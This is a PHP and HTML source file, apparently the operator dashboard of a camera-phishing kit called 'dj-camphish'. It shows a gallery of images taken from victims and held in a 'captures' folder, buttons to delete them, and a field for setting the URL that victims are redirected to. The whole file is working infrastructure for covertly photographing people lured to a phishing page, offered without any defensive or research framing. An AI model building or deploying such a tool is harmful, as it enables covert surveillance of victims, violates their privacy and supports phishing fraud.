<?php
$dir = "captures/";
$images = array_diff(scandir($dir), array('..', '.'));
$redirectFile = 'redirect.txt';
$currentRedirect = file_exists($redirectFile) ? trim(file_get_contents($redirectFile)) : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>dj-camphish - Captured Gallery</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0e0e0e; color: #f1f1f1; margin: 0; padding: 1rem; }
        h1 { text-align: center; margin: 1rem 0; font-weight: 500; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; padding: 1rem; }
        .image-container { position: relative; cursor: pointer; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.5); transition: transform 0.2s, opacity 0.2s, box-shadow 0.3s; }
        .image-container img { width: 100%; display: block; transition: transform 0.3s; }
        .image-container:hover { transform: scale(1.02); box-shadow: 0 6px 15px rgba(0,0,0,0.6); }
        .image-container.selected { transform: scale(0.97); opacity: 0.7; border: 2px solid #00ff88; }
        .controls { text-align: center; margin: 1rem; }
        button { padding: 10px 20px; margin: 5px; background: #00aaff; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 1rem; transition: background 0.3s; }
        button:hover { background: #0077cc; }
        button:disabled { background: #444; cursor: not-allowed; }
        .redirect-section { text-align: center; margin: 20px 0; }
        input[type="text"] { padding: 10px; width: 60%; border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 1rem; }
        @media (max-width: 600px) { input[type="text"] { width: 90%; } }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: #fff; padding: 10px 20px; border-radius: 6px; opacity: 0; pointer-events: none; transition: opacity 0.5s, bottom 0.5s; }
        .toast.show { opacity: 1; bottom: 40px; pointer-events: auto; }
    </style>
</head>
<body>
    <h1>📸 Captured Gallery - dj-camphish</h1>

    <div class="redirect-section">
        <input type="text" id="redirectInput" placeholder="Enter redirect URL..." value="<?= htmlspecialchars($currentRedirect) ?>">
        <button id="updateRedirectBtn">🔄 Update Redirect URL</button>
    </div>

    <div class="controls">
        <button id="deleteBtn" disabled>🗑️ Delete Selected Images</button>
    </div>

    <div class="gallery">
        <?php foreach ($images as $image): ?>
            <div class="image-container" data-filename="<?= htmlspecialchars($image) ?>">
                <img src="captures/<?= htmlspecialchars($image) ?>" alt="Captured Image">
            </div>
        <?php endforeach; ?>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        const containers = document.querySelectorAll('.image-container');
        const deleteBtn = document.getElementById('deleteBtn');
        const updateRedirectBtn = document.getElementById('updateRedirectBtn');
        const redirectInput = document.getElementById('redirectInput');
        const toast = document.getElementById('toast');
        let selected = new Set();

        function showToast(message) {
            toast.textContent = message;
            toast.classList.add('show');
            setTimeout(() => { toast.classList.remove('show'); }, 2500);
        }

        containers.forEach(container => {
            container.addEventListener('click', () => {
                const filename = container.getAttribute('data-filename');
                if (selected.has(filename)) {
                    selected.delete(filename);
                    container.classList.remove('selected');
                } else {
                    selected.add(filename);
                    container.classList.add('selected');
                }
                deleteBtn.disabled = selected.size === 0;
            });
        });

        deleteBtn.addEventListener('click', () => {
            if (!confirm('Are you sure you want to delete the selected images?')) return;
            fetch('delete_images.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ images: Array.from(selected) })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    selected.forEach(filename => {
                        document.querySelector(`[data-filename="${filename}"]`).remove();
                    });
                    selected.clear();
                    deleteBtn.disabled = true;
                    showToast('Images deleted successfully!');
                } else {
                    showToast('Error deleting images.');
                }
            });
        });

        updateRedirectBtn.addEventListener('click', () => {
            const newURL = redirectInput.value.trim();
            if (!newURL) { showToast('Please enter a valid URL.'); return; }
            fetch('update_redirect.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ redirect: newURL })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showToast('Redirect URL updated!');
                } else {
                    showToast('Failed to update redirect URL.');
                }
            });
        });
    </script>
</body>
</html>
